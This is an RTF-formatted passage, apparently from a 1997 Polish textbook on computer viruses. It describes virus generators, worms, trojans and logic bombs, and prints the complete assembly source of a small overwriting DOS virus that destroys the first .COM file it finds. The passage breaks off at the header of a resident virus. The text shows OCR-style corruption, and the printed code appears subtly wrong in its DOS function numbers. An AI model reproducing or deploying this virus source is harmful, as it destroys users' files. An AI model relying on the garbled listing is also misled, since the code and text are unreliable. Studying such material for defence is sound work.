\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do mno\uc1\u380\'bfenia si\uc1\u281\'ea makrowirusy wykorzystuj\uc1\u261\'b9 funkcje zawarte w j\uc1\u281\'eazykach makr, wbudowanych w powy\uc1\u380\'bfsze aplikacje, np. WordBasic w Microsoft Word lub Visual Basie for Application}{\f1\fs24\lang1045{\*\listtag0}s w programie Microsoft Excel.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.5. Generatory wirus\'f3w}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na przestrzeni ostatnich kilku lat pojawi\uc1\u322\'b3o si\uc1\u281\'ea wiele program\'f3w umo\uc1\u380\'bfliwiaj\uc1\u261\'b9cych stworzenie w\uc1\u322\'b3asnego wirusa, nawet bez znajomo\uc1\u347\'9cci systemu, czy mechanizm\'f3w wykorzystywanych przez wirusy. Narz\uc1\u281\'eadzia tego typu s\uc1\u261\'b9 dost\uc1\u281\'eapne w sieci Internet. Korzystaj\uc1\u261\'b9c z gotowych modu\uc1\u322\'b3\'f3w w asemblerze mo\uc1\u380\'bfna utworzy\uc1\u263\'e6 wirusa o zadanych parametrach, wybieranych najcz\uc1\u281\'ea\uc1\u347\'9cciej przy pomocy przyjaznego u\uc1\u380\'bfytkownikowi menu lub specjalnego pliku definicyjnego. Mo\uc1\u380\'bfna wi\uc1\u281\'eac okre\uc1\u347\'9cli\uc1\u263\'e6 zakres}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}obiekt\'f3w infekowanych przez tworzonego wirusa, rodzaj efekt\'f3w specjalnych, spos\'f3b ewentualnej destrukcji, a tak\uc1\u380\'bfe warunki zadzia\uc1\u322\'b3ania efekt\'f3w specjalnych. Opr\'f3cz kodu wynikowego wirusa (gotowego do uruchomienia) generatory tworz\uc1\u261\'b9 tak\uc1\u380\'bfe pe\uc1\u322\'b3ne, najcz\uc1\u281\'ea\uc1\u347\'9cciej }{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}obrze opisane \uc1\u378\'9fr\'f3d\uc1\u322\'b3a w asemblerze, co umo\uc1\u380\'bfliwia przeci\uc1\u281\'eatnemu, ale zainteresowanemu pisaniem wirus\'f3w u\uc1\u380\'bfytkownikowi, dokszta\uc1\u322\'b3cenie si\uc1\u281\'ea w tej dziedzinie. Najbardziej znane generatory wirus\'f3w to: IVP (Instant Virus Production Kit), VCL (Virus Construction Lab}{\f1\fs24\lang1045{\*\listtag0}oratory), PS-MPC (Phalcon-Skism-Mass Produced Code Generator), G2 (G Squared) i NRLG (NukE Randomic Life Generator).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.6. Robaki (ang. }{\f1\fs28\i\lang1045{\*\listtag0}worms}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Robak to program, kt\'f3rego dzia\uc1\u322\'b3anie sprowadza si\uc1\u281\'ea do tworzenia w\uc1\u322\'b3asnych duplikat\'f3w, tak \uc1\u380\'bfe nie atakuje on \uc1\u380\'bfadnych obiekt\'f3w, jak to czyni\uc1\u261\'b9 wirusy. Opr\'f3cz zajmowania miejsca na dysku program ten rzadko wywo\uc1\u322\'b3uje skutki uboczne. Podobnie jak wirusy towarzysz\uc1\u261\'b9ce, robaki najcz\uc1\u281\'ea\uc1\u347\'9cciej pisane s\uc1\u261\'b9 w j\uc1\u281\'eazykach wysokiego poziomu. Robaki s\uc1\u261\'b9 najbardziej popularne w sieciach, gdzie m}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}j\uc1\u261\'b9 do dyspozycji protoko\uc1\u322\'b3y transmisji sieciowej, dzi\uc1\u281\'eaki kt\'f3rym mog\uc1\u261\'b9 przemieszcza\uc1\u263\'e6 si\uc1\u281\'ea po ca\uc1\u322\'b3ej sieci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.7. Konie troja\uc1\u324\'f1skie (ang. }{\f1\fs28\i\lang1045{\*\listtag0}trojan horses}{\f1\fs28\lang1045{\*\listtag0})}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ko\uc1\u324\'f1 troja\uc1\u324\'f1ski nie jest wirusem komputerowym, ale ze wzgl\uc1\u281\'eadu na swoje dzia\uc1\u322\'b3anie (najcz\uc1\u281\'ea\uc1\u347\'9cciej destrukcyjne) cz\uc1\u281\'easto bywa z nim uto\uc1\u380\'bfsamiany.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zasada dzia\uc1\u322\'b3ania koma troja\uc1\u324\'f1skiego jcst banalnie prosta. Uruchomio-ny, wykonuje niby to normaln\uc1\u261\'b9 prace, bezpo\uc1\u347\'9crednio wynikaj\uc1\u261\'b9ca , przeznaczenia programu (np.: gra, demo, program u\uc1\u380\'bfytkowy), lecz dodatkowo, niejako w tle, wykonuje jakies niezauwa\uc1\u380\'bfalne dla u\uc1\u380\'bfyt-kownika operacje, (najcz\uc1\u281\'ea\uc1\u347\'9cciej po prostu niszczy - kasuje lub zamazu-je - dane na dysku twardym).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Konie troja\uc1\u324\'f1skie najcz\uc1\u281\'ea\uc1\u347\'9cciej przenosz\uc1\u261\'b9 sie w plikach udaj\uc1\u261\'b9cych nowe, popularne programy kompresuj\uc1\u261\'b9ce (np.: PKZIP, ARJ. RAR) lub te\uc1\u380\'bf udaj\uc1\u261\'b9 programy narzedziowe do obs\uc1\u322\'b3ugi dysk\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.8. Bomby logiczne (ang. }{\f1\fs28\i\lang1045{\*\listtag0}logical bombs}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch O ile ko\uc1\u324\'f1 troja\uc1\u324\'f1ski wykonuje brudn\uc1\u261\'b9 robot\uc1\u281\'ea od razu po uruchomieniu, o tyle bomba swe destrukcyjne oblicze ukazuje tylko w okre\uc1\u347\'9clonym odpowiednimi warunkami czasie (najcz\uc1\u281\'ea\uc1\u347\'9cciej zale\uc1\u380\'bfnie od aktualnej daty lub liczby poprzednich wywo\uc1\u322\'b3a\uc1\u324\'f1 programu). Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf w\uc1\u322\'b3a\uc1\u347\'9cciwy, destrukcyjny kod mo\uc1\u380\'bfe by\uc1\u263\'e6 ukryty w dowolnym miejscu programu zawieraj\uc1\u261\'b9cego bomb\uc1\u281\'ea, nale\uc1\u380\'bfy ostro\uc1\u380\'bfnie obchodzi\uc1\u263\'e6 si\uc1\u281\'ea z aplikacjami, kt\'f3rych pochodz}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}nie jest nieznane. Mianem bomby okre\uc1\u347\'9cla si\uc1\u281\'ea cz\uc1\u281\'easto tak\uc1\u380\'bfe destrukcyjny, uruchamiany tylko po spe\uc1\u322\'b3nieniu jakiego\uc1\u347\'9c warunku, kod zawarty w wirusach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs32\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 3}{\f0\fs32\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs32\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.1. Wirusy nierezydentne (ang. }{\f1\fs28\i\lang1045{\*\listtag0}non-resident viruses}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy nierezydentne s\uc1\u261\'b9 najprostsz\uc1\u261\'b9 odmian\uc1\u261\'b9 wirus\'f3w komputerowych zara\uc1\u380\'bfaj\uc1\u261\'b9cych pliki wykonywalne. Po uruchomieniu nosiciela poszukiwany jest, najcz\uc1\u281\'ea\uc1\u347\'9cciej przy pomocy funkcji (4E/4F/21), kolejny obiekt do zara\uc1\u380\'bfenia. W przypadku nie znalezienia \uc1\u380\'bfadnego kandydata, sterowanie oddawane jest do nosiciela}{\f1\fs24\lang1045{\*\listtag0},}{\f0\fs24\lang1045{\*\listtag0} w przeciwnym razie znaleziony plik jest infekowany. Ofiary poszukiwane s\uc1\u261\'b9 w bie\uc1\u380\'bf\uc1\u261\'b9cym katalogu i/lub w katalogach okre\uc1\u347\'9clonych w zmiennej \uc1\u347\'9crodowiskowej PATH, i/lub w podkatalogach bie\uc1\u380\'bf\uc1\u261\'b9cego katalogu, i/lub w katalogu g\uc1\u322\'b3\'f3wnym. Z regu\uc1\u322\'b3y wirus taki nie przejm}{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}je \uc1\u380\'bfadnego przerwania (ewentualnie na czas infekcji przejmowane jest przerwanie programowe 24h, kt\'f3re jest odpowiedzialne za obs\uc1\u322\'b3ug\uc1\u281\'ea b\uc1\u322\'b3\uc1\u281\'ead\'f3w krytycznych). G\uc1\u322\'b3\'f3wn\uc1\u261\'b9 wad\uc1\u261\'b9 wirus\'f3w nierezydentnych jest to, i\uc1\u380\'bf poszukiwanie ofiar przy starcie programu wi\uc1\u261\'b9\uc1\u380\'bfe si\uc1\u281\'ea na}{\f1\fs24\lang1045{\*\listtag0}j}{\f0\fs24\lang1045{\*\listtag0}cz\uc1\u281\'ea\uc1\u347\'9cciej z du\uc1\u380\'bfym op\'f3\uc1\u378\'9fnieniem w uruchomieniu w\uc1\u322\'b3a\uc1\u347\'9cciwego programu oraz \uc1\u322\'b3atwo zauwa\uc1\u380\'bfaln\uc1\u261\'b9 przez u\uc1\u380\'bfytkownika wzmo\uc1\u380\'bfon\uc1\u261\'b9 aktywno\uc1\u347\'9cci\uc1\u261\'b9 przeszukiwanego no\uc1\u347\'9cnika. Drugim powa\uc1\u380\'bfnym mankamentem jest to, i\uc1\u380\'bf zara\uc1\u380\'bfaj\uc1\u261\'b9 one tylko i wy\uc1\u322\'b3\uc1\u261\'b9cznie po uruchomieniu nosiciela, a wi\uc1\u281\'eac }{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ie mog\uc1\u261\'b9 efektywnie infekowa\uc1\u263\'e6 plik\'f3w ani te\uc1\u380\'bf skutecznie maskowa\uc1\u263\'e6 swej obecno\uc1\u347\'9cci w7 systemie, tak jak czyni\uc1\u261\'b9 to wirusy rezydentne. Wirusy nierezydentne s\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej wypuszczane przez oszo\uc1\u322\'b3omionych pierwszym sukcesem, pocz\uc1\u261\'b9tkuj\uc1\u261\'b9cych tw\'f3rc\'f3w^ wirus\'f3w. O tym}{\f1\fs24\lang1045{\*\listtag0},}{\f0\fs24\lang1045{\*\listtag0} jak prosto napisa\uc1\u263\'e6 najprymitywniejsz\uc1\u261\'b9 wersj\uc1\u281\'ea wirusa nierezydentnego, niech \uc1\u347\'9cwiadczy poni\uc1\u380\'bfsza kr\'f3tka sekwencja napisana w asemblerze. Po skompilowaniu otrzymujemy program, kt\'f3ry po uruchomieniu szuka przy pomocy funkcji (4E/21) pierwszego pliku o rozszerz}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}niu COM w aktualnym katalogu i po ewentualnym jego znalezieniu przepisuje sw\'f3j kod na pocz\uc1\u261\'b9tek ofiary. Wirus ten jest bardzo prymitywny w swym dzia\uc1\u322\'b3aniu, gdy\uc1\u380\'bf nieodwracalnie niszczy zara\uc1\u380\'bfany przez siebie plik (jest to wirus}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch nadpisuj\uc1\u261\'b9cy), a tak\uc1\u380\'bfe nie posiada \uc1\u380\'bfadnej obs\uc1\u322\'b3ugi b\uc1\u322\'b3\uc1\u281\'ead\'f3w (w przypadku nieznalezienia ofiary wirus "zainfekuje"... ekran). Jego wykrycie to kwestia bardzo kr\'f3tkiego czasu (programy COM przestan\uc1\u261\'b9 "nagle" dzia\uc1\u322\'b3a\uc1\u263\'e6).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                    PRYMITYW v1.0, Autor : Adam Blaszczyk 1997              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                      Prymitywny wirus nierezydentny nadpisujacy,           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                      atakujacy i niszczacy pierwszy znaleziony             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                      w katalogu plik COM                                   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     PRYMITYW.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t PRYMITYW.OBJ                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PRYMITYW SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS: PRYMITYW, DS:PRYMITYW}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          WirDlug = Offset (WirKoniec-WirStart)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; WirDlug okresla dlugosc calego kodu wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WirStart:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  cx,20h             ; atrybut poszukiwanej pozycji katalogu (Archive)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  dx,Offset PlikiCOM ; szukaj plikow *.COM}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  ah,4Fh             ; funkcja DOS - szukaj pozycji w katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int  21h                ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  ax,3D02h           ; funkcja DOS - otworz plik do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  dx,9Fh             ; nazwa znalezionego pliku w buforze DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; znajdujacym sie pod adresem CS:80h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int  21h                ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      xchg ax,bx              ; przenies  uchwyt pliku z AX do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  cx,WirDlug         ; podaj ile bajtow zapisac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  dx,100h            ; zapisuj spod adresu CS:100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  ah,30h             ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int  21h                ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      ret                     ; rownoznaczne z wykonaniem Int 20h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  PlikiCOM db '*.COM'         ; maska dla poszukiwanych pozycji w katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  WirKoniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  PRYMITYW ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  END WirStart}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.2. Wirusy rezydentne (ang. }{\f1\fs28\i\lang1045{\*\listtag0}resident viruses}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Autorzy wirus\'f3w szybko zorientowali si\uc1\u281\'ea, \uc1\u380\'bfe dzia\uc1\u322\'b3aj\uc1\u261\'b9ce tylko po uruchomieniu nosiciela wirusy nierezydentne maj\uc1\u261\'b9 do\uc1\u347\'9c\uc1\u263\'e6 ograniczone pole manewru, st\uc1\u261\'b9d te\uc1\u380\'bf poszukiwali Jakiego\uc1\u347\'9c mechanizmu, kt\'f3ry pozwala\uc1\u322\'b3by na nieprzerwane monitorowanie systemu operacyjnego. Z pomoc\uc1\u261\'b9 przyszli im nie\uc1\u347\'9cwiadomie sami autorzy systemu DOS, implementuj\uc1\u261\'b9c w typowo jednozadaniowym \uc1\u347\'9crodowisku mechanizm sztucznej wi}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}lozadaniowo\uc1\u347\'9cci. Zasada dzia\uc1\u322\'b3ania wirus\'f3w rezyden-tnych polega bowiem na zainstalowaniu si\uc1\u281\'ea w pami\uc1\u281\'eaci operacyjnej komputera i przej\uc1\u281\'eaciu odpowiednich odwo\uc1\u322\'b3a\uc1\u324\'f1 do systemu w spos\'f3b podobny do tego, w jaki czyni\uc1\u261\'b9 to programy typu TSR (ang. Terminate but Stay Re}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}ident). W zasadzie typowy wirus rezydentny to program TSR, kt\'f3ry po zainstalowaniu ukrywa sw\'f3j kod przed programami przegl\uc1\u261\'b9daj\uc1\u261\'b9cymi pami\uc1\u281\'ea\uc1\u263\'e6. Aktywny i jednocze\uc1\u347\'9cnie ukryty w pami\uc1\u281\'eaci, ma o wiele szersze pole manewru ni\uc1\u380\'bf wirusy nierezydentne. Monitorowanie od}{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}owiednich funkcji DOS i BIOS pozwala mu bowiem przy ka\uc1\u380\'bfdej dowolnej pr\'f3bie dost\uc1\u281\'eapu na infekcj\uc1\u281\'ea plik\'f3w lub sektor\'f3w. Mo\uc1\u380\'bfliwe staje si\uc1\u281\'ea tak\uc1\u380\'bfe zastosowanie techniki zaawansowanego ukrywania si\uc1\u281\'ea w systemie (tzw. technika stealth, om\'f3wiona w dalszej cz\uc1\u281\'ea\uc1\u347\'9cci opr}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}cowania). Zaw\uc1\u322\'b3adni\uc1\u281\'eacia systemem dokonuje si\uc1\u281\'ea poprzez przej\uc1\u281\'eacie odpowiednich przerwa\uc1\u324\'f1 sprz\uc1\u281\'eatowych i funkcji obs\uc1\u322\'b3ugiwanych przez og\'f3lnie dost\uc1\u281\'eapne przerwania programowe.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na szybko\uc1\u347\'9c\uc1\u263\'e6 mno\uc1\u380\'bfenia si\uc1\u281\'ea wirusy rezydentne dzie\uc1\u322\'b3a si\uc1\u281\'ea na szybkie intektory i wolne infektory. Poni\uc1\u380\'bfej przedstawiono przyk\uc1\u322\'b3ad prostego wirusa rezydentnego, infekuj\uc1\u261\'b9cego pliki COM podczas ich uruchamiania.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  KOMBAJN v1.0, Autor : Adam Blaszczyk 1997                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Prosty wirus rezydentny plikow COM                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
